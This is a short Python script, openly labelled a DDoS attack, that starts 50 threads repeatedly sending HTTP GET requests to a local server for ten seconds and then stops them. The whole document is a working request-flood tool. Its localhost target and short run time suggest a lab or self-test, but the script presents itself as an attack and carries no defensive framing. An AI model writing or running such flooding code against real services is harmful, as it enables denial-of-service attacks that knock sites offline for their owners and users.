import requests
import threading
import time

url = "http://localhost:8000"
attack_running = True  # Add a flag to control thread exit

def send_requests():
    while attack_running:
        try:
            print("Sending request...")
            response = requests.get(url)
            print(f"Status Code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")

def launch_ddos(num_threads=50):
    print(f"Starting DDoS attack on {url} with {num_threads} threads.")
    threads = []
    for i in range(num_threads):
        thread = threading.Thread(target=send_requests)
        thread.start()
        threads.append(thread)
    return threads

if __name__ == "__main__":
    print("Launching the DDoS script...")
    threads = launch_ddos()
    time.sleep(10)  # Let the attack run
    attack_running = False  # Stop the attack
    for t in threads:
        t.join()  # Wait for all threads to finish
    print("DDoS attack completed.")
